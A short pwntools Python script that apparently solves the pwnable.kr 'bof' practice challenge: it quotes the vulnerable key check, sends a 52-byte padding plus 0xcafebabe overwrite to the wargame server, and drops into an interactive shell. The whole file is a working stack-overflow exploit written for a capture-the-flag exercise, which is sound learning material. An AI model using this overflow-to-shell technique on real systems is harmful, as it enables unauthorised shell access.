from pwn import *

'''
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
'''

p = remote("pwnable.kr",9000)
playload = "A"*52+"\xbe\xba\xfe\xca"

p.sendline(playload)
p.interactive()